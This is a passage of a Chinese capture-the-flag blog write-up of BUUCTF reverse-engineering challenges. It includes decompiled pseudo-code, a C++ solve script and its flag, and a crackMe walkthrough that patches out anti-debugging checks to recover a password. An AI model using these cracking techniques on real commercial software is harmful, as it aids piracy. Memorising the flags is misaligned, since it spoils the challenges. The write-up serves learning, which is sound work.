class="number">37</span>]);</span><br><span class="line">v4[<span class="number">6</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[7] = a1[43] ^ (a1[40] + v3[7]); -&gt; v3[7] = (v4[7] ^ a1[43]) - a1[40];</span></span><br><span class="line">v5 = a1[<span class="number">40</span>] + v3[<span class="number">7</span>];</span><br><span class="line">v3[<span class="number">7</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">43</span>] ^ v3[<span class="number">7</span>];</span><br><span class="line">v4[<span class="number">7</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[8] = (v3[8] + 1) - 1; -&gt; v3[8] = (v4[8] + 1) - 1;</span></span><br><span class="line">v5 = v3[<span class="number">8</span>] + <span class="number">1</span>;</span><br><span class="line">v3[<span class="number">8</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">8</span>] - <span class="number">1</span>;</span><br><span class="line">v4[<span class="number">8</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[9] = a1[53] + (a1[50] * v3[9]); -&gt; v3[9] = (v4[9] - a1[53])/a1[50];</span></span><br><span class="line">v5 = a1[<span class="number">50</span>] * v3[<span class="number">9</span>];</span><br><span class="line">v3[<span class="number">9</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">53</span>] + v3[<span class="number">9</span>];</span><br><span class="line">v4[<span class="number">9</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[10] = a1[59] ^ (a1[56] + v3[10]); -&gt; v3[10] = (v4[10] ^ a1[59]) - a1[56];</span></span><br><span class="line">v5 = a1[<span class="number">56</span>] + v3[<span class="number">10</span>];</span><br><span class="line">v3[<span class="number">10</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">59</span>] ^ v3[<span class="number">10</span>];</span><br><span class="line">v4[<span class="number">10</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[11] = a1[65] * (a1[62] + v3[11]); -&gt; v3[11] = (v4[11] / a1[65]) - a1[62];</span></span><br><span class="line">v5 = a1[<span class="number">62</span>] + v3[<span class="number">11</span>];</span><br><span class="line">v3[<span class="number">11</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">65</span>] * v3[<span class="number">11</span>];</span><br><span class="line">v4[<span class="number">11</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[12] = a1[71] + (a1[68] * v3[12]); -&gt; v3[12] = (v4[12] - a1[71]) /a1[68]; </span></span><br><span class="line">v5 = a1[<span class="number">68</span>] * v3[<span class="number">12</span>];</span><br><span class="line">v3[<span class="number">12</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">71</span>] + v3[<span class="number">12</span>];</span><br><span class="line">v4[<span class="number">12</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[13] = (a1[74] ^ v3[13]) - LOBYTE(a1[77]); -&gt; v3[13] = (v4[13] + LOBYTE(a1[77])) ^ a1[74];</span></span><br><span class="line">v5 = a1[<span class="number">74</span>] ^ v3[<span class="number">13</span>];</span><br><span class="line">v3[<span class="number">13</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">13</span>] - LOBYTE(a1[<span class="number">77</span>]);</span><br><span class="line">v4[<span class="number">13</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[14] = (a1[80] + v3[14]) + 1; -&gt; v3[14] = (v4[14] - 1) - a1[80];</span></span><br><span class="line">v5 = a1[<span class="number">80</span>] + v3[<span class="number">14</span>];</span><br><span class="line">v3[<span class="number">14</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">14</span>] + <span class="number">1</span>;</span><br><span class="line">v4[<span class="number">14</span>] = v5;</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a1[] =  &#123;<span class="number">10L</span>, <span class="number">4L</span>, <span class="number">16L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">5L</span>, <span class="number">1L</span>, <span class="number">4L</span>, <span class="number">32L</span>, <span class="number">8L</span>, <span class="number">5L</span>, <span class="number">3L</span>, <span class="number">1L</span>, <span class="number">3L</span>, <span class="number">2L</span>, <span class="number">8L</span>, <span class="number">11L</span>, <span class="number">1L</span>, <span class="number">12L</span>, <span class="number">8L</span>, <span class="number">4L</span>, <span class="number">4L</span>, <span class="number">1L</span>, <span class="number">5L</span>, <span class="number">3L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">33L</span>, <span class="number">1L</span>, <span class="number">11L</span>, <span class="number">8L</span>, <span class="number">11L</span>, <span class="number">1L</span>, <span class="number">4L</span>, <span class="number">9L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">32L</span>, <span class="number">1L</span>, <span class="number">2L</span>, <span class="number">81L</span>, <span class="number">8L</span>, <span class="number">4L</span>, <span class="number">36L</span>, <span class="number">1L</span>, <span class="number">12L</span>, <span class="number">8L</span>, <span class="number">11L</span>, <span class="number">1L</span>, <span class="number">5L</span>, <span class="number">2L</span>, <span class="number">8L</span>, <span class="number">2L</span>, <span class="number">37L</span>, <span class="number">1L</span>, <span class="number">2L</span>, <span class="number">54L</span>, <span class="number">8L</span>, <span class="number">4L</span>, <span class="number">65L</span>, <span class="number">1L</span>, <span class="number">2L</span>, <span class="number">32L</span>, <span class="number">8L</span>, <span class="number">5L</span>, <span class="number">1L</span>, <span class="number">1L</span>, <span class="number">5L</span>, <span class="number">3L</span>, <span class="number">8L</span>, <span class="number">2L</span>, <span class="number">37L</span>, <span class="number">1L</span>, <span class="number">4L</span>, <span class="number">9L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">32L</span>, <span class="number">1L</span>, <span class="number">2L</span>, <span class="number">65L</span>, <span class="number">8L</span>, <span class="number">12L</span>, <span class="number">1L</span>,  <span class="number">7L</span>, <span class="number">34L</span>, <span class="number">7L</span>, <span class="number">63L</span>, <span class="number">7L</span>, <span class="number">52L</span>, <span class="number">7L</span>, <span class="number">50L</span>, <span class="number">7L</span>, <span class="number">114L</span>, <span class="number">7L</span>, <span class="number">51L</span>, <span class="number">7L</span>, <span class="number">24L</span>, <span class="number">7L</span>, <span class="number">4294967207L</span>, <span class="number">7L</span>, <span class="number">49L</span>, <span class="number">7L</span>, <span class="number">4294967281L</span>, <span class="number">7L</span>, <span class="number">40L</span>, <span class="number">7L</span>, <span class="number">4294967172L</span>, <span class="number">7L</span>, <span class="number">4294967233L</span>, <span class="number">7L</span>, <span class="number">30L</span>, <span class="number">7L</span>, <span class="number">122L</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v4[] = &#123;<span class="number">34L</span>, <span class="number">63L</span>, <span class="number">52L</span>, <span class="number">50L</span>,  <span class="number">114L</span>,  <span class="number">51L</span>, <span class="number">24L</span>, <span class="number">167L</span>, <span class="number">49L</span>, <span class="number">241L</span>, <span class="number">40L</span>, <span class="number">132L</span>, <span class="number">193L</span>, <span class="number">30L</span>, <span class="number">122L</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v3[<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line">    v3[<span class="number">0</span>] = (v4[<span class="number">0</span>] + <span class="built_in">LOBYTE</span>(a1[<span class="number">5</span>])) ^ a1[<span class="number">2</span>];</span><br><span class="line">    v3[<span class="number">1</span>] = (v4[<span class="number">1</span>] / a1[<span class="number">11</span>]) ^ a1[<span class="number">8</span>];</span><br><span class="line">    v3[<span class="number">2</span>] = v4[<span class="number">2</span>] + <span class="built_in">LOBYTE</span>(a1[<span class="number">14</span>]) +<span class="number">1</span>;</span><br><span class="line">    v3[<span class="number">3</span>] = (a1[<span class="number">21</span>] ^ v4[<span class="number">3</span>]) <span class="number">-1</span>;</span><br><span class="line">    v3[<span class="number">4</span>] = (v4[<span class="number">4</span>] + <span class="built_in">LOBYTE</span>(a1[<span class="number">27</span>])) / a1[<span class="number">24</span>];</span><br><span class="line">    v3[<span class="number">5</span>] = (v4[<span class="number">5</span>] + <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    v3[<span class="number">6</span>] = (v4[<span class="number">6</span>] + <span class="built_in">LOBYTE</span>(a1[<span class="number">37</span>])) ^ a1[<span class="number">34</span>];</span><br><span class="line">    v3[<span class="number">7</span>] = (v4[<span class="number">7</span>] ^ a1[<span class="number">43</span>]) - a1[<span class="number">40</span>];</span><br><span class="line">    v3[<span class="number">8</span>] = (v4[<span class="number">8</span>] + <span class="number">1</span>) - <span class="number">1</span>;</span><br><span class="line">    v3[<span class="number">9</span>] = (v4[<span class="number">9</span>] - a1[<span class="number">53</span>])/a1[<span class="number">50</span>];</span><br><span class="line">    v3[<span class="number">10</span>] = (v4[<span class="number">10</span>] ^ a1[<span class="number">59</span>]) - a1[<span class="number">56</span>];</span><br><span class="line">    v3[<span class="number">11</span>] = (v4[<span class="number">11</span>] / a1[<span class="number">65</span>]) - a1[<span class="number">62</span>];</span><br><span class="line">    v3[<span class="number">12</span>] = (v4[<span class="number">12</span>] - a1[<span class="number">71</span>]) /a1[<span class="number">68</span>]; </span><br><span class="line">    v3[<span class="number">13</span>] = (v4[<span class="number">13</span>] + <span class="built_in">LOBYTE</span>(a1[<span class="number">77</span>])) ^ a1[<span class="number">74</span>];</span><br><span class="line">    v3[<span class="number">14</span>] = (v4[<span class="number">14</span>] - <span class="number">1</span>) - a1[<span class="number">80</span>];</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;flag&#123;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// cout&lt;&lt;i&lt;&lt;&quot;  &quot;&lt;&lt;v3[i]&lt;&lt;&quot; &quot;&lt;&lt;char(v3[i])&lt;&lt;endl;</span></span><br><span class="line">        cout&lt;&lt;<span class="built_in"><span class="keyword">char</span></span>(v3[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;&#125;&quot;</span>&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{757515121f3d478}</p>
<p>这里还看到了一个新的技术，标记一下，以后有时间了学习</p>
<p>[(117条消息) BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52369224/article/details/121319151">网鼎杯 2020 青龙组]singal——angr学习记录_1ens的博客-CSDN博客</a></p>
<h1 id="35-crackMe"><a href="#35-crackMe" class="headerlink" title="35.crackMe"></a>35.crackMe</h1><p>小张从网上下载到一个黑客软件，然而开发者并不打算共享，所以小张注册了一个用户名叫welcomebeijing，但是密码需要进行逆向计算，请求出密码，进行MD5的32位小写哈希，进行提交。 注意：得到的 flag 请包上 flag{} 提交</p>
<p>运行程序试试</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709110538857.png" alt="image-20230709110538857"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709110606924.png" alt="image-20230709110606924"></p>
<p>先打开ida看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709111738959.png" alt="image-20230709111738959"></p>
<p>重点就是这个while循环，动调一下，看看if判断的地址</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709111914730.png" alt="image-20230709111914730"></p>
<p>00401DD，打开x32dbg，本来想直接跳转到这里下断点，但似乎</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709112301563.png" alt="image-20230709112301563"></p>
<p>地址不一样，那还是直接调试吧</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709112551263.png" alt="image-20230709112551263"></p>
<p>查看字符串信息，先在输入密码的那里下个断点吧</p>
<p>一个个单步调试</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709113521586.png" alt="image-20230709113521586"></p>
<p>00691DEC是判断密码正不正确的地方，但是x32的汇编太难看了，还是直接在ida看吧</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709113852982.png" alt="image-20230709113852982"></p>
<p>跟进这个函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709113911884.png" alt="image-20230709113911884"></p>
<p>但是这个代码不能反编译，看了看别的师傅的</p>
<p>，这里将爆红的部分nop掉就行，应该是某种反调试技术</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709114718719.png" alt="image-20230709114718719"></p>
<p>我用的keypatch，然后选中这些红色的部分，按p将他们定义为一个函数，就可以反汇编了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4011A0</span><span class="params">(_BYTE *a1, _BYTE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> _EAX; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> _EAX; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> _EAX; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  *a1 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">  _EAX = <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  __asm &#123; aam &#125;</span><br><span class="line">  a1[<span class="number">2</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  a1[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  a1[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  a1[<span class="number">5</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  _EAX = <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">6</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  __asm &#123; aad &#125;</span><br><span class="line">  a1[<span class="number">7</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  a1[<span class="number">8</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  a1[<span class="number">9</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  a1[<span class="number">10</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  a1[<span class="number">11</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  a1[<span class="number">12</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  a1[<span class="number">13</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">  a1[<span class="number">14</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  a1[<span class="number">15</span>] = <span class="string">&#x27;:&#x27;</span>;</span><br><span class="line">  a1[<span class="number">16</span>] = <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">  a1[<span class="number">17</span>] = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">  a1[<span class="number">18</span>] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  a1[<span class="number">19</span>] = <span class="number">0</span>;</span><br><span class="line">  *a2 = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">  a2[<span class="number">1</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  a2[<span class="number">2</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  a2[<span class="number">3</span>] = <span class="number">97</span>;</span><br><span class="line">  a2[<span class="number">4</span>] = <span class="number">115</span>;</span><br><span class="line">  LOBYTE(_EAX) = (_BYTE)a2;</span><br><span class="line">  a2[<span class="number">5</span>] = <span class="number">101</span>;</span><br><span class="line">  __asm &#123; daa &#125;</span><br><span class="line">  a2[<span class="number">6</span>] = <span class="number">32</span>;</span><br><span class="line">  a2[<span class="number">7</span>] = <span class="number">116</span>;</span><br><span class="line">  a2[<span class="number">8</span>] = <span class="number">114</span>;</span><br><span class="line">  a2[<span class="number">9</span>] = <span class="number">121</span>;</span><br><span class="line">  a2[<span class="number">10</span>] = <span class="number">32</span>;</span><br><span class="line">  a2[<span class="number">11</span>] = <span class="number">97</span>;</span><br><span class="line">  a2[<span class="number">12</span>] = <span class="number">103</span>;</span><br><span class="line">  a2[<span class="number">13</span>] = <span class="number">97</span>;</span><br><span class="line">  a2[<span class="number">14</span>] = <span class="number">105</span>;</span><br><span class="line">  a2[<span class="number">15</span>] = <span class="number">110</span>;</span><br><span class="line">  __rdtsc();</span><br><span class="line">  a2[<span class="number">16</span>] = <span class="number">13</span>;</span><br><span class="line">  a2[<span class="number">17</span>] = <span class="number">10</span>;</span><br><span class="line">  __rdtsc();</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  a2[<span class="number">18</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>貌似就是将congratulation赋值，这里的result赋值为了1，就说明v3的判断可以满足了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230709115104428.png" alt="image-20230709115104428"></p>
<p>跟进</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">sub_401830</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+30h] [ebp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+36h] [ebp-20Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+37h] [ebp-20Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+38h] [ebp-20Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// [esp+39h] [ebp-20Bh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// [esp+3Ah] [ebp-20Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+3Bh] [ebp-209h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+3Ch] [ebp-208h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+40h] [ebp-204h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">255</span>]; <span class="comment">// [esp+41h] [ebp-203h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [esp+140h] [ebp-104h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">255</span>]; <span class="comment">// [esp+141h] [ebp-103h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; <span class="built_in">strlen</span>(a2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">isdigit</span>(a2[v6]) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = a2[v6] - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">isxdigit</span>(a2[v6]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">24</span>) + <span class="number">12</span>) != <span class="number">2</span> )</span><br><span class="line">        a2[v6] = <span class="number">34</span>;</span><br><span class="line">      v8 = (a2[v6] | <span class="number">0x20</span>) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = ((a2[v6] | <span class="number">0x20</span>) - <span class="number">97</span>) % <span class="number">6</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __rdtsc();</span><br><span class="line">    __rdtsc();</span><br><span class="line">    v9 = v8 + <span class="number">16</span> * v9;</span><br><span class="line">    <span class="keyword">if</span> ( !((<span class="keyword">int</span>)(v6 + <span class="number">1</span>) % <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v14 + v3++) = v9;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 += byte_416050[++v11];</span><br><span class="line">    v12 = byte_416050[v11];</span><br><span class="line">    v7 = byte_416050[v10];</span><br><span class="line">    byte_416050[v10] = v12;</span><br><span class="line">    byte_416050[v11] = v7;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">104</span>) &amp; <span class="number">0x70</span>) != <span class="number">0</span> )</span><br><span class="line">      v12 = v10 + v11;</span><br><span class="line">    *(&amp;v16 + v5) = byte_416050[(<span class="keyword">unsigned</span> __int8)(v7 + v12)] ^ *(&amp;v14 + v4);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-83</span>;</span><br><span class="line">      v11 = <span class="number">43</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401710(&amp;v16, a1, v5++);</span><br><span class="line">    v4 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(&amp;v14 + <span class="built_in">strlen</span>(&amp;v14) + <span class="number">1</span> - v15) )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  sub_401470(&amp;v16, &amp;v13);</span><br><span class="line">  <span class="keyword">return</span> v13 == <span class="number">0xAB94</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>进入一个 <code>while</code> 循环，循环条件是 <code>v6 &lt; strlen(a2)</code>，即遍历字符串 <code>a2</code> 的每个字符。</li>
<li>在循环中，根据字符的类型进行不同的处理：<ul>
<li>如果字符是数字，则将其转换为相应的数值。</li>
<li>如果字符是十六进制数字，则进行一些额外的操作，同时检查一个条件，如果条件满足，则将当前字符替换为双引号（34 的 ASCII 值）。</li>
<li>如果字符不是数字也不是十六进制数字，则进行另一种处理。</li>
</ul>
</li>
<li>在每次循环迭代中，执行了两次 <code>__rdtsc()</code> 指令，该指令用于获取 CPU 的时间戳计数（TSC）值。</li>
<li>计算了一个值 <code>v9</code>，通过对前面处理得到的数值进行操作和移位得到。每当处理了两个字符后，将 <code>v9</code> 存储到 <code>v14</code> 数组中，并将 <code>v9</code> 重置为 0。</li>
<li>接下来有一个 <code>while</code> 循环，循环条件是 <code>v5 &lt; 8</code>。在每次循环迭代中，执行以下操作：<ul>
<li>对一系列名为 <code>byte_416050</code> 的数组进行一些计算和交换。</li>
<li>检查一个条件，并根据条件修改变量 <code>v12</code> 和 <code>v11</code>。</li>
<li>对数组 <code>byte_416050</code> 进行异或操作，并将结果存储到 <code>v16</code> 数组中。</li>
